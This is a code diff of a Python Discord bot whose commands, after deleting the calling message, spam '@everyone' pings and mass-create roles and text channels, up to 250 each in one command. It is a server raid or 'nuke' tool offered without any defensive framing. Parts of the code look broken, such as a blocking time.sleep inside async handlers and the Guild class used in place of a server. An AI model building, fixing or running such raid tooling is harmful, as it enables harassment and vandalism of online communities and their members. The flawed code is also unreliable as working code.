@@ -1,7 +1,6 @@
 import discord
 from discord.ext import commands
-from asyncio import sleep
-from discord.utils import get
+import time
 
 token = 'a token'
 bot = commands.Bot(command_prefix='%')
@@ -10,39 +9,34 @@ guild = discord.Guild
 @bot.command()
 async def boom(ctx, arg=10):
     await ctx.message.delete()
-    booms = 0
-    while booms <= int(arg):
-        await ctx.send('BOOM BOOM BAKUDAN! ||@everyone||')
-        booms += 1
-    booms = 0
+    
+    for i in range(0, arg):
+        await ctx.send('BOOM! ||@everyone||')
+        time.sleep(0.5)
 
 @bot.command()
 async def bang_roles(ctx, arg=10):
     await ctx.message.delete()
-    bangs = 0
-    while bangs <= int(arg):
-        await guild.create_role(name='Boing, boing, boom!')
-        bangs += 1
-    bangs = 0
+
+    for i in range(0, arg):
+        await guild.create_role(name='BOOM!')
+        time.sleep(0.5)
 
 @bot.command()
 async def bang_channels(ctx, arg=10):
     await ctx.message.delete()
-    bangs = 0
-    while bangs <= int(arg):
-        await guild.create_text_channel(name="Sparks \'n\'Splash!")
-        bangs += 1
-bangs = 0
+    for i in range(0, arg):
+        await guild.create_text_channel(name="BOOM!")
+        time.sleep(0.5)
+
 
 @bot.command()
 async def bigbang(ctx):
     await ctx.message.delete()
-    bigbangs = 0
-    while 250 >= bigbangs:
+    for i in range(0, 250):
         await ctx.guild.create_text_channel(name="BOOM!")
         await ctx.send("@everyone")
         await ctx.guild.create_role(name="BOOM!")
-        bigbangs += 1
-    bigbangs = 0
+        time.sleep(0.5)
 
 bot.run(token)
